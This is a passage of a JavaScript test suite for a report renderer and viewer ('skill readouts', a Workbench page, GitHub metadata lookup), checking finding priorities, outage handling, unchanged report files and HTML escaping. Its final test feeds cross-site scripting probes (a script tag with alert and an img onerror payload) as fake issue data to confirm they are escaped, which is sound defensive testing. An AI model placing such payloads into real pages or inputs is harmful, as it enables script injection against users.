  assert.match(featured[1], /full-height viewport regression remains reproducible/);
  assert.doesNotMatch(featured[1], /routine observation must not conceal/);
  assert.match(html, /NEEDS ATTENTION/);
  assert.match(html, /1 explicitly recorded exception/);
  assert.match(html, /aria-label="1 of 3 recorded checks passed"/);
  assert.match(html, /presentation-ring-failed/);
  assert.doesNotMatch(html, /aria-label="3 of 3 recorded checks passed"/);
});

test("blocked B reports count only observed exceptions and feature the most severe recorded finding", () => {
  const html = renderSkillReadout({
    skill: "qs-code-debug",
    status: "Blocked",
    outcome: "Awaiting correction of an independently recorded production blocker.",
    findings: [
      { title: "Observed high-priority layout defect", priority: "P1" },
      { title: "Observed critical repository-ownership failure", priority: "P0" },
      { title: "Recorded low-priority formatting observation", priority: "P3" },
    ],
    checks: [
      { title: "Recorded regression check", status: "failed" },
      { title: "Recorded unaffected check", status: "passed" },
    ],
  });
  const featured = html.match(
    /<article class="presentation-featured-signal">([\s\S]*?)<\/article>/,
  );

  assert.ok(featured, "the blocked report still exposes its actual leading exception");
  assert.match(featured[1], />P0</);
  assert.match(featured[1], /critical repository-ownership failure/);
  assert.match(html, /4 explicitly recorded exceptions/);
  assert.match(html, /aria-label="1 of 2 recorded checks passed"/);
  assert.doesNotMatch(html, /5 explicitly recorded exceptions/);
});

test("a GitHub issue outage preserves verified repository metadata without inventing zero issues", async () => {
  const project = {
    host: "github.com",
    owner: "quickstark",
    repository: "skills",
    key: "github.com/quickstark/skills",
    label: "quickstark/skills",
    source: "explicit",
  };
  const fetcher = async (url) => url.endsWith("/issues?state=open&per_page=8")
    ? new Response(null, { status: 503 })
    : new Response(JSON.stringify({
      full_name: "quickstark/skills",
      html_url: "https://github.com/quickstark/skills",
      default_branch: "main",
      visibility: "public",
    }), { headers: { "Content-Type": "application/json" } });
  const github = await observeGitHubProject(project, { fetcher });
  const report = normalizeSkillReadout({
    skill: "qs-code-debug",
    outcome: "Preserve independently verified repository ownership during an issue API outage.",
    projectIdentity: project,
  });
  const metadata = renderReadoutProjectMetadata(report, { github });
  const summary = renderReadoutSignalSummary(
    report,
    READOUT_PROFILES_BY_NAME[report.skill.name],
    { github },
  );

  assert.equal(github.fullName, "quickstark/skills");
  assert.equal(github.issues, null);
  assert.match(metadata, /GitHub verified/);
  assert.match(metadata, /quickstark\/skills/);
  assert.match(metadata, /main/);
  assert.match(
    summary,
    /<span>OPEN ISSUES<\/span><strong>—<\/strong><small>Not independently verified<\/small>/,
  );
  assert.equal(renderReadoutGitHubIssues(github), "");
});

test("the full-height production Workbench preserves the leading B exception and complete immutable report", async (context) => {
  const { directory, viewer } = await productionWorkbench(context);
  const report = await writeSkillReadout({
    skill: "qs-code-debug",
    outcome: "Protect the actual full-height production report from recorded regressions.",
    generatedAt: "2026-07-27T15:00:00.000Z",
    projectIdentity: quickStarkProject,
    findings: [
      { title: "Earlier recorded P1 layout regression", priority: "P1" },
      { title: "Later recorded P0 authorization regression", priority: "P0" },
    ],
    checks: [{ title: "Actual full-height regression check", status: "passed" }],
  }, { directory, layout: "project" });
  const original = await readFile(report.path, "utf8");
  const parameters = new URLSearchParams({
    project: quickStarkProject.key,
    report: report.relativePath,
  });
  const response = await fetch(new URL(`?${parameters}`, viewer.url));
  const html = await response.text();
  const selected = html.match(
    /<aside\b[^>]*aria-label="Selected skill readout"[^>]*>([\s\S]*?)<\/aside>/,
  );
  const stylesheet = html.match(/<style\b[^>]*>([\s\S]*?)<\/style>/i);
  const immutable = await fetch(new URL(report.relativePath, viewer.url));

  assert.equal(response.status, 200);
  assert.ok(selected, "the verified report remains inside the actual project-first Workbench");
  assert.match(selected[1], /aria-label="Verified project and run metadata"/);
  assert.match(selected[1], /aria-label="Five-second report summary"/);
  assert.match(selected[1], />P0</);
  assert.match(selected[1], /Later recorded P0 authorization regression/);
  assert.match(selected[1], /Use \$qs-test-tdd/);
  assert.match(selected[1], /aria-label="Complete immutable skill readout"/);
  assert.ok(stylesheet, "the production Workbench remains a self-contained full-height application");
  assert.match(stylesheet[1], /\.workbench-page\s*\{[^}]*height\s*:\s*100dvh/);
  assert.match(stylesheet[1], /\.workbench-shell\s*\{[^}]*max-height\s*:\s*none/);
  assert.doesNotMatch(html, /<script\b|<iframe\b/i);
  assert.equal(immutable.status, 200);
  assert.equal(await immutable.text(), original);
  assert.equal(await readFile(report.path, "utf8"), original);
});

test("production B keeps a profile-free historical readout readable without changing its immutable bytes", async (context) => {
  const { directory, viewer } = await productionWorkbench(context);
  const report = await writeSkillReadout({
    skill: "qs-code-build",
    outcome: "Preserve an existing historical production report.",
    generatedAt: "2026-07-26T15:00:00.000Z",
    projectIdentity: quickStarkProject,
    findings: [{ title: "Recorded historical finding" }],
    outputs: [{ title: "Recorded historical delivery" }],
    checks: [{ title: "Recorded historical verification", status: "passed" }],
  }, { directory, layout: "project" });
  const current = await readFile(report.path, "utf8");
  const historical = current
    .replace(/\s*<meta name="quickstark:report-profile" content="[^"]*">/, "")
    .replace("<h2>Deliverables</h2>", "<h2>Outputs</h2>")
    .replace("<h2>Verification</h2>", "<h2>Checks</h2>");

  assert.notEqual(historical, current, "the fixture is an actual profile-free historical report");
  assert.doesNotMatch(historical, /<meta name="quickstark:report-profile"/);

  await writeFile(report.path, historical, "utf8");

  const parameters = new URLSearchParams({
    project: quickStarkProject.key,
    report: report.relativePath,
  });
  const response = await fetch(new URL(`?${parameters}`, viewer.url));
  const html = await response.text();
  const selected = html.match(
    /<aside\b[^>]*aria-label="Selected skill readout"[^>]*>([\s\S]*?)<\/aside>/,
  );
  const immutable = await fetch(new URL(report.relativePath, viewer.url));

  assert.equal(response.status, 200);
  assert.ok(selected, "the historical readout remains in the verified production Workbench");
  assert.match(selected[1], /Recorded historical finding/);
  assert.match(selected[1], /Recorded historical delivery/);
  assert.match(selected[1], /Recorded historical verification/);
  assert.match(selected[1], /aria-label="Complete immutable skill readout"/);
  assert.equal(immutable.status, 200);
  assert.equal(await immutable.text(), historical);
  assert.equal(await readFile(report.path, "utf8"), historical);
});

test("verified issue summaries escape GitHub-controlled titles and labels without activating page content", async () => {
  const fetcher = async (url) => new Response(JSON.stringify(
    url.endsWith("/issues?state=open&per_page=8")
      ? [{
        number: 21,
        state: "open",
        title: '<script>alert("untrusted issue title")</script> report',
        html_url: "https://github.com/quickstark/skills/issues/21",
        labels: [{ name: '<img src=x onerror="alert(1)">' }],
      }]
      : {
        full_name: "quickstark/skills",
        html_url: "https://github.com/quickstark/skills",
        default_branch: "main",
        visibility: "public",
      },
  ), { headers: { "Content-Type": "application/json" } });
  const github = await observeGitHubProject(quickStarkProject, { fetcher });
  const issues = renderReadoutGitHubIssues(github);

  assert.match(issues, /Relevant open issues/);
  assert.match(issues, /https:\/\/github\.com\/quickstark\/skills\/issues\/21/);
  assert.match(issues, /&lt;script&gt;alert\(&quot;untrusted issue title&quot;\)&lt;\/script&gt;/);
  assert.match(issues, /&lt;img src=x onerror=&quot;alert\(1\)&quot;&gt;/);
  assert.doesNotMatch(issues, /<(?:script|img)\b|<[a-z][^<>]*\sonerror\s*=/i);
});
